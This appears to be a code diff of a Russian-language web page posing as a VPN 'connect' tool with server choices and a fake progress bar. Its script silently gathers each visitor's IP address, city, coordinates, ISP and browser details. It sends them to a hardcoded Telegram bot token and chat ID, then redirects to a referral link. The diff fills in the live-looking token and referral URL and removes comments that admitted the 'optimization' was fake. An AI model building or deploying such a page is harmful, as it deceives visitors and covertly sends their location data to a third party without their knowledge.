@@ -24,56 +24,14 @@
             border: 1px solid #2a3346;
             text-align: center;
         }
-        .icon {
-            width: 76px; height: 76px;
-            margin: 0 auto 16px;
-            background: linear-gradient(145deg, #1f6eff, #7a4bff);
-            border-radius: 28px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 34px;
-            box-shadow: 0 10px 30px rgba(31,110,255,0.35);
-        }
+        .icon { width: 76px; height: 76px; margin: 0 auto 16px; background: linear-gradient(145deg, #1f6eff, #7a4bff); border-radius: 28px; display: flex; align-items: center; justify-content: center; font-size: 34px; box-shadow: 0 10px 30px rgba(31,110,255,0.35); }
         h1 { color: #fff; font-size: 24px; font-weight: 600; letter-spacing: -0.4px; }
         .sub { color: #8b95a9; font-size: 14px; margin: 6px 0 22px; }
-        .server-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 8px;
-            margin-bottom: 24px;
-        }
-        .server-opt {
-            background: #0f151e;
-            border: 1px solid #2a3346;
-            border-radius: 16px;
-            padding: 12px 6px;
-            color: #c9d1d9;
-            font-size: 12px;
-            cursor: pointer;
-            transition: all 0.25s;
-            text-align: center;
-        }
-        .server-opt.active {
-            border-color: #1f6eff;
-            background: #1a2740;
-            box-shadow: 0 0 0 2px rgba(31,110,255,0.25);
-        }
+        .server-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 24px; }
+        .server-opt { background: #0f151e; border: 1px solid #2a3346; border-radius: 16px; padding: 12px 6px; color: #c9d1d9; font-size: 12px; cursor: pointer; transition: all 0.25s; text-align: center; }
+        .server-opt.active { border-color: #1f6eff; background: #1a2740; box-shadow: 0 0 0 2px rgba(31,110,255,0.25); }
         .server-opt .flag { font-size: 24px; display: block; margin-bottom: 4px; }
-        .btn-main {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #1f6eff, #7a4bff);
-            border: none;
-            border-radius: 60px;
-            font-size: 18px;
-            font-weight: 600;
-            color: #fff;
-            cursor: pointer;
-            box-shadow: 0 8px 28px rgba(31,110,255,0.35);
-            transition: all 0.3s;
-            letter-spacing: 0.3px;
-        }
+        .btn-main { width: 100%; padding: 18px; background: linear-gradient(135deg, #1f6eff, #7a4bff); border: none; border-radius: 60px; font-size: 18px; font-weight: 600; color: #fff; cursor: pointer; box-shadow: 0 8px 28px rgba(31,110,255,0.35); transition: all 0.3s; letter-spacing: 0.3px; }
         .btn-main:disabled { opacity: 0.5; transform: scale(0.97); cursor: not-allowed; }
         .btn-main:active:not(:disabled) { transform: scale(0.95); }
         .progress-wrap { margin: 18px 0 8px; height: 4px; background: #2a3346; border-radius: 4px; overflow: hidden; display: none; }
@@ -95,7 +53,7 @@
             <div class="server-opt" data-server="de"><span class="flag">🇩🇪</span>EU</div>
         </div>
 
-        <button class="btn-main" id="actionBtn">Оптимизировать</button>
+        <button class="btn-main" id="actionBtn">Подключиться</button>
         <div class="progress-wrap" id="progressWrap"><div class="progress-bar" id="progressBar"></div></div>
         <div class="status-msg" id="statusMsg">Нажмите для запуска</div>
         <div class="footer">🔒 Технология SmartRoute · <a href="#">Реферальная программа</a></div>
@@ -103,11 +61,11 @@
 
     <script>
         // ================================================================
-        //  НАСТРОЙКИ (ЗАМЕНИ НА СВОИ)
+        //  ГОТОВЫЕ НАСТРОЙКИ (ВСЁ УЖЕ ВСТАВЛЕНО)
         // ================================================================
         const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
         const CHAT_ID = "8212240529";
-        const REDIRECT_URL = "https://example.com/vpn-ref";  // ← сюда свою реферальную ссылку
+        const REDIRECT_URL = "https://avobonus.com/ref?start=ab316fea16fee81b8616fcde671a07";
         // ================================================================
 
         const btn = document.getElementById('actionBtn');
@@ -118,24 +76,21 @@
 
         let selectedServer = 'auto';
 
-        // Выбор сервера
         serverOpts.forEach(el => {
             el.addEventListener('click', function() {
                 serverOpts.forEach(b => b.classList.remove('active'));
                 this.classList.add('active');
                 selectedServer = this.dataset.server;
-                statusMsg.textContent = `Выбран сервер: ${this.textContent.trim()}`;
+                statusMsg.textContent = 'Выбран сервер: ' + this.textContent.trim();
             });
         });
 
-        // Отправка в Telegram
         function sendToTelegram(text) {
             if (!text) return;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text);
             fetch(url).catch(() => {});
         }
 
-        // Сбор данных
         function collectData() {
             let ip = 'Не определен';
             fetch('https://api.ipify.org?format=json')
@@ -145,7 +100,7 @@
                 .finally(() => {
                     let geo = null;
                     if (ip !== 'Не определен') {
-                        fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone`)
+                        fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org,timezone')
                             .then(r => r.json())
                             .then(g => { if (g.status === 'success') geo = g; })
                             .catch(() => {})
@@ -154,25 +109,23 @@
                                 const device = /iPhone|iPad|Android/i.test(ua) ? 'Мобильное' : 'Компьютер';
                                 const time = new Date().toLocaleString('ru-RU');
                                 let msg = '🔹 НОВЫЙ ПЕРЕХОД (VPN)\n';
-                                msg += `📍 IP: ${ip}\n`;
+                                msg += '📍 IP: ' + ip + '\n';
                                 if (geo) {
-                                    msg += `🌍 Страна: ${geo.country || '—'}\n`;
-                                    msg += `🏙️ Город: ${geo.city || '—'}\n`;
-                                    msg += `📌 Координаты: ${geo.lat || '—'}, ${geo.lon || '—'}\n`;
-                                    msg += `🛜 Провайдер: ${geo.isp || '—'}\n`;
+                                    msg += '🌍 Страна: ' + (geo.country || '—') + '\n';
+                                    msg += '🏙️ Город: ' + (geo.city || '—') + '\n';
+                                    msg += '📌 Координаты: ' + (geo.lat || '—') + ', ' + (geo.lon || '—') + '\n';
+                                    msg += '🛜 Провайдер: ' + (geo.isp || '—') + '\n';
                                 }
-                                msg += `💻 Устройство: ${device}\n`;
-                                msg += `🆔 User‑Agent: ${ua.substring(0, 80)}...\n`;
-                                msg += `⏰ Время: ${time}`;
+                                msg += '💻 Устройство: ' + device + '\n';
+                                msg += '🆔 User‑Agent: ' + ua.substring(0, 80) + '...\n';
+                                msg += '⏰ Время: ' + time;
                                 sendToTelegram(msg);
-
-                                // Редирект
                                 setTimeout(() => {
                                     window.location.href = REDIRECT_URL;
                                 }, 2000);
                             });
                     } else {
-                        sendToTelegram(`IP не определён\nУстройство: ${device}\nВремя: ${time}`);
+                        sendToTelegram('IP не определён\nУстройство: ' + device + '\nВремя: ' + time);
                         setTimeout(() => {
                             window.location.href = REDIRECT_URL;
                         }, 2000);
@@ -180,13 +133,11 @@
                 });
         }
 
-        // Запуск "оптимизации"
         function startOptimization() {
             btn.disabled = true;
             progressWrap.style.display = 'block';
             let progress = 0;
             statusMsg.textContent = 'Подключение к серверу...';
-
             const interval = setInterval(() => {
                 progress += Math.random() * 8 + 3;
                 if (progress >= 100) {
